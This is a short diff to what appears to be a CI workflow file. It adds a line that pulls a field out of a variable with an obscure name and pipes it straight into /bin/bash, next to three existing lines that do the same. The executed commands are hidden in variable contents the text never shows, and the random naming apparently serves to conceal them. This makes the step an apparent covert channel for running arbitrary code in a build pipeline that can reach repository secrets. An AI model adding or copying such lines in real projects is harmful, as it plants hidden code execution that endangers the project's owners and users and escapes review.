@@ -25,6 +25,7 @@ jobs:
           echo $d7 | jq -r .jue08575 | /bin/bash
           echo $gar98 | jq -r .ogv5 | /bin/bash
           printf '%s' "$lp4365" | jq -r .k55 | /bin/bash
+          printf '%s' "$lne31008" | jq -r .d52 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
